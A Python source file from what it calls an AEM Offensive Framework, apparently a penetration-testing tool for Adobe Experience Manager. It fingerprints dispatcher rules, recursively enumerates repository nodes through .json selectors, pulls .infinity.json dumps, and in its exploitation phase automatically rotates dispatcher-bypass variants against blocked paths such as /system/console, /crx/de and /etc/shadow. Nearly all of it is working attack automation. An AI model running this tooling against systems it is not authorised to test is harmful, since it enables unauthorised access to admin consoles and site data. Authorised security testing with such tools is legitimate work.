"""Multi-phase discovery system for AEM Offensive Framework.

Phase 1: Fingerprinting - Dispatcher rules and server type detection
Phase 2: Contextual Discovery - Child node enumeration via .json selectors  
Phase 3: Payload Injection - Active exploitation with bypass rotation
"""

import asyncio
import json
import re
from typing import List, Dict, Set, Optional, Callable
from dataclasses import dataclass, field

from core.models import ScanPhase, Finding, VulnSeverity, TargetInfo, ServerType, AttackPath
from core.config import AEMConfig
from core.engine import HTTPXEngine, ResponseWrapper
from bypass.transformers import BypassTransformer, BypassResult


@dataclass
class PhaseResult:
    """Result from a scan phase."""
    phase: ScanPhase
    findings: List[Finding] = field(default_factory=list)
    target_info: Optional[TargetInfo] = None
    new_paths: Set[str] = field(default_factory=set)


class Phase1Fingerprinting:
    """Phase 1: Fingerprint Dispatcher rules and server type."""
    
    DISPATCHER_ENDPOINTS = [
        "/dispatcher/invalidate.cache",
        "/system/sling/form/login",
        "/libs/granite/core/content/login.html",
        "/crx/explorer/index.jsp",
        "/crx/de/index.jsp",
        "/system/console",
    ]
    
    AUTHOR_INDICATORS = [
        "/sites.html",
        "/assets.html", 
        "/useradmin",
        "/miscadmin",
        "/crx/de",
        "/system/console/configMgr",
    ]
    
    def __init__(self, engine: HTTPXEngine, config: AEMConfig, bypass: BypassTransformer):
        self.engine = engine
        self.config = config
        self.bypass = bypass
        self.target_info: Optional[TargetInfo] = None
    
    async def execute(self, base_url: str) -> PhaseResult:
        """Execute fingerprinting phase."""
        print(f"[Phase 1] Fingerprinting target: {base_url}")
        
        self.target_info = TargetInfo(url=base_url)
        findings: List[Finding] = []
        
        # Detect server type and AEM version
        server_finding = await self._detect_server_type(base_url)
        if server_finding:
            findings.append(server_finding)
        
        # Test dispatcher behavior
        dispatcher_findings = await self._test_dispatcher(base_url)
        findings.extend(dispatcher_findings)
        
        # Detect blocked patterns
        blocked_finding = await self._detect_blocked_patterns(base_url)
        if blocked_finding:
            findings.append(blocked_finding)
        
        return PhaseResult(
            phase=ScanPhase.FINGERPRINTING,
            findings=findings,
            target_info=self.target_info,
            new_paths=self.target_info.detected_paths
        )
    
    async def _detect_server_type(self, base_url: str) -> Optional[Finding]:
        """Detect if target is Author or Publish instance."""
        # Test author-specific endpoints
        for endpoint in self.AUTHOR_INDICATORS[:3]:
            response = await self.engine.get(f"{base_url}{endpoint}")
            
            if response.status_code == 200:
                self.target_info.server_type = ServerType.AUTHOR
                return Finding(
                    phase=ScanPhase.FINGERPRINTING,
                    technique="Server Type Detection",
                    url=f"{base_url}{endpoint}",
                    severity=VulnSeverity.INFO,
                    title="AEM Author Instance Detected",
                    description=f"Target appears to be an AEM Author instance based on accessible {endpoint}",
                    evidence={"status_code": response.status_code, "endpoint": endpoint}
                )
            elif response.status_code in [401, 403]:
                # Blocked but exists - likely author
                if "login" in response.text.lower() or response.status_code == 401:
                    self.target_info.server_type = ServerType.AUTHOR
        
        # Check for publish indicators
        response = await self.engine.get(f"{base_url}/content.json")
        if response.status_code == 200 and '"items":' in response.text:
            self.target_info.server_type = ServerType.PUBLISH
            return Finding(
                phase=ScanPhase.FINGERPRINTING,
                technique="Server Type Detection",
                url=f"{base_url}/content.json",
                severity=VulnSeverity.INFO,
                title="AEM Publish Instance Detected",
                description="Target appears to be an AEM Publish instance",
                evidence={"response_snippet": response.text[:200]}
            )
        
        return None
    
    async def _test_dispatcher(self, base_url: str) -> List[Finding]:
        """Test dispatcher configuration and bypass potential."""
        findings = []
        
        # Test cache invalidation endpoint
        cache_resp = await self.engine.get(f"{base_url}/dispatcher/invalidate.cache")
        if cache_resp.status_code != 404:
            findings.append(Finding(
                phase=ScanPhase.FINGERPRINTING,
                technique="Dispatcher Cache Endpoint",
                url=f"{base_url}/dispatcher/invalidate.cache",
                severity=VulnSeverity.MEDIUM if cache_resp.status_code == 200 else VulnSeverity.LOW,
                title="Dispatcher Cache Endpoint Accessible",
                description=f"Dispatcher invalidate.cache returns {cache_resp.status_code}",
                evidence={"status": cache_resp.status_code}
            ))
        
        # Test filter bypass indicators
        test_paths = ["/etc.json", "/libs.json", "/apps.json"]
        allowed_selectors = []
        
        for path in test_paths:
            response = await self.engine.get(f"{base_url}{path}")
            if response.status_code == 200:
                allowed_selectors.append(path)
                self.target_info.detected_paths.add(path.replace(".json", ""))
        
        if allowed_selectors:
            findings.append(Finding(
                phase=ScanPhase.FINGERPRINTING,
                technique="Selector Analysis",
                url=base_url,
                severity=VulnSeverity.LOW,
                title="Dispatcher Allows JSON Selectors",
                description=f"Dispatcher allows .json selectors on: {', '.join(allowed_selectors)}",
                evidence={"allowed_paths": allowed_selectors}
            ))
        
        self.target_info.allowed_selectors = allowed_selectors
        return findings
    
    async def _detect_blocked_patterns(self, base_url: str) -> Optional[Finding]:
        """Detect which patterns are blocked by dispatcher."""
        blocked_patterns = []
        test_cases = [
            ("/admin", "Admin path"),
            ("/system/console", "OSGi Console"),
            ("/crx/de", "CRXDE Lite"),
            ("/etc/shadow", "Shadow file"),
        ]
        
        for path, desc in test_cases:
            response = await self.engine.get(f"{base_url}{path}")
            if response.status_code in [403, 404, 401] or "dispatcher" in response.text.lower():
                blocked_patterns.append((path, desc, response.status_code))
        
        if blocked_patterns:
            self.target_info.blocked_patterns = [p[0] for p in blocked_patterns]
            return Finding(
                phase=ScanPhase.FINGERPRINTING,
                technique="Dispatcher Rule Detection",
                url=base_url,
                severity=VulnSeverity.INFO,
                title="Dispatcher Blocking Patterns Detected",
                description=f"Found {len(blocked_patterns)} blocked patterns",
                evidence={"blocked": blocked_patterns}
            )
        
        return None


class Phase2Discovery:
    """Phase 2: Contextual path discovery via child node enumeration."""
    
    KEY_PATHS = [
        "/content", "/etc", "/var", "/home", "/libs", "/apps", "/bin"
    ]
    
    def __init__(self, engine: HTTPXEngine, config: AEMConfig, bypass: BypassTransformer):
        self.engine = engine
        self.config = config
        self.bypass = bypass
        self.discovered_paths: Set[str] = set()
    
    async def execute(self, base_url: str, target_info: TargetInfo) -> PhaseResult:
        """Execute discovery phase."""
        print(f"[Phase 2] Contextual discovery on {base_url}")
        
        findings: List[Finding] = []
        
        for base_path in self.KEY_PATHS:
            path_findings = await self._enumerate_path(base_url, base_path, depth=0)
            findings.extend(path_findings)
        
        # Check node counts before infinity dumps
        infinity_findings = await self._safe_infinity_check(base_url)
        findings.extend(infinity_findings)
        
        return PhaseResult(
            phase=ScanPhase.DISCOVERY,
            findings=findings,
            new_paths=self.discovered_paths
        )
    
    async def _enumerate_path(
        self, 
        base_url: str, 
        path: str, 
        depth: int = 0
    ) -> List[Finding]:
        """Enumerate child nodes via .1.json, .2.json selectors.
        
        On 403/401, auto-invokes bypass engine before giving up.
        """
        findings = []
        
        if depth > self.config.max_depth:
            return findings
        
        # Try different child node selectors
        selectors = [".1.json", ".2.json", ".4.json", ".-1.json"]
        
        for selector in selectors:
            url = f"{base_url}{path}{selector}"
            response = await self.engine.get(url)
            
            # Auto-bypass on block
            if response.status_code in [401, 403, 404]:
                response = await self.engine.get_with_bypass_fallback(
                    url, base_url, f"{path}{selector}",
                    bypass_transformer=self.bypass,
                    max_bypass_attempts=15
                )
            
            if response.status_code == 200:
                try:
                    data = json.loads(response.text)
                    
                    # Check if we got meaningful data
                    if isinstance(data, dict) and any(k != "jcr:primaryType" for k in data.keys()):
                        finding = Finding(
                            phase=ScanPhase.DISCOVERY,
                            technique="Child Node Enumeration",
                            url=url,
                            severity=VulnSeverity.INFO,
                            title=f"Accessible Child Nodes: {path}",
                            description=f"Found accessible child nodes at {path}{selector}",
                            evidence={
                                "nodes": list(data.keys())[:20],
                                "count": len(data)
                            },
                            chainable=True
                        )
                        findings.append(finding)
                        
                        # Add discovered paths for further enumeration
                        for key in data.keys():
                            if not key.startswith("jcr:") and ":" not in key:
                                new_path = f"{path}/{key}"
                                if new_path not in self.discovered_paths:
                                    self.discovered_paths.add(new_path)
                                    # Recursive enumeration
                                    sub_findings = await self._enumerate_path(
                                        base_url, new_path, depth + 1
                                    )
                                    findings.extend(sub_findings)
                        
                        break  # Found working selector
                        
                except json.JSONDecodeError:
                    pass
        
        return findings
    
    async def _safe_infinity_check(self, base_url: str) -> List[Finding]:
        """Check .infinity.json with safety brake via .stat.json."""
        findings = []
        
        # First check node count via .stat.json
        stat_paths = ["/content.stat.json", "/etc.stat.json", "/var.stat.json"]
        
        for stat_path in stat_paths:
            stat_url = f"{base_url}{stat_path}"
            response = await self.engine.get(stat_url)
            
            if response.status_code == 200:
                try:
                    stats = json.loads(response.text)
                    node_count = stats.get("jcr:nodeCount", 0)
                    base_path = stat_path.replace(".stat.json", "")
                    
                    finding_data = {
                        "path": base_path,
                        "node_count": node_count,
                        "stats": stats
                    }
                    
                    # Safety brake check
                    if node_count < self.config.infinity_safety_threshold:
                        # Safe to try infinity
                        inf_url = f"{base_url}{base_path}.infinity.json"
                        inf_response = await self.engine.get(inf_url)
                        
                        if inf_response.status_code == 200:
                            findings.append(Finding(
                                phase=ScanPhase.DISCOVERY,
                                technique="Infinity JSON Dump",
                                url=inf_url,
                                severity=VulnSeverity.HIGH,
                                title=f"Recursive JSON Dump Available: {base_path}",
                                description=f"Full recursive dump available at {inf_url} ({node_count} nodes)",
                                evidence=finding_data,
                                chainable=True
                            ))
                    else:
                        findings.append(Finding(
                            phase=ScanPhase.DISCOVERY,
                            technique="Node Count Detection",
                            url=stat_url,
                            severity=VulnSeverity.MEDIUM,
                            title=f"Large Node Count Detected: {base_path}",
                            description=f"{base_path} has {node_count} nodes (safety threshold exceeded)",
                            evidence=finding_data
                        ))
                        
                except json.JSONDecodeError:
                    pass
        
        return findings


class Phase3Exploitation:
    """Phase 3: Payload injection with automatic bypass rotation."""
    
    def __init__(
        self, 
        engine: HTTPXEngine, 
        config: AEMConfig, 
        bypass: BypassTransformer
    ):
        self.engine = engine
        self.config = config
        self.bypass = bypass
    
    async def execute(
        self, 
        base_url: str, 
        target_info: TargetInfo,
        discovered_paths: Set[str]
    ) -> PhaseResult:
        """Execute exploitation phase."""
        print(f"[Phase 3] Exploitation phase with bypass rotation")
        
        findings: List[Finding] = []
        
        # Try bypasses on blocked patterns
        for blocked_path in target_info.blocked_patterns:
            bypass_findings = await self._try_bypasses(base_url, blocked_path)
            findings.extend(bypass_findings)
        
        # Also try bypasses on discovered paths that returned 403
        for path in discovered_paths:
            url = f"{base_url}{path}"
            response = await self.engine.get(url)
            if response.status_code in [401, 403]:
                bypass_findings = await self._try_bypasses(base_url, path)
                findings.extend(bypass_findings)
        
        return PhaseResult(
            phase=ScanPhase.EXPLOITATION,
            findings=findings
        )
    
    async def _try_bypasses(self, base_url: str, path: str) -> List[Finding]:
        """Try all bypass techniques on a blocked path."""
        findings = []
        
        # Generate bypass variants
        variants = self.bypass.generate_all_variants(path, max_results=50)
        
        for variant in variants:
            url = f"{base_url}{variant.url}"
            response = await self.engine.get(
                url, 
                bypass=variant.technique.value,
                technique=variant.description
            )
            
            # Check for successful bypass
            if response.status_code == 200 and response.text:
                # Verify it's not a generic error page
                if self._is_valid_response(response):
                    findings.append(Finding(
                        phase=ScanPhase.EXPLOITATION,
                        technique="Bypass Success",
                        url=url,
                        severity=VulnSeverity.HIGH,
                        title=f"Dispatcher Bypass: {path}",
                        description=f"Successfully bypassed dispatcher using {variant.technique.value}",
                        evidence={
                            "bypass_technique": variant.technique.value,
                            "description": variant.description,
                            "response_length": len(response.text)
                        },
                        bypass_used=variant.technique,
                        chainable=True,
                        prerequisites=["fingerprinting"]
                    ))
                    break  # Found working bypass
        
        return findings
    
    def _is_valid_response(self, response: ResponseWrapper) -> bool:
        """Check if response indicates successful bypass."""
        indicators = [
            "jcr:primaryType",
            "sling:resourceType",
            "cq:component",
            "<html",
            "{",
        ]
        
        text = response.text[:1000]
        return any(indicator in text for indicator in indicators)


class PhaseManager:
    """Manages execution of all scan phases."""
    
    def __init__(self, engine: HTTPXEngine, config: AEMConfig):
        self.engine = engine
        self.config = config
        self.bypass = BypassTransformer()
        
        self.phase1 = Phase1Fingerprinting(engine, config, self.bypass)
        self.phase2 = Phase2Discovery(engine, config, self.bypass)
        self.phase3 = Phase3Exploitation(engine, config, self.bypass)
    
    async def run_all_phases(self, target_url: str) -> List[PhaseResult]:
        """Execute all phases sequentially."""
        results = []
        
        # Phase 1: Fingerprinting
        p1_result = await self.phase1.execute(target_url)
        results.append(p1_result)
        
        # Phase 2: Discovery (uses Phase 1 info)
        target_info = p1_result.target_info or TargetInfo(url=target_url)
        p2_result = await self.phase2.execute(target_url, target_info)
        results.append(p2_result)
        
        # Phase 3: Exploitation (uses Phase 1 & 2 data)
        all_discovered = p1_result.new_paths | p2_result.new_paths
        p3_result = await self.phase3.execute(target_url, target_info, all_discovered)
        results.append(p3_result)
        
        return results
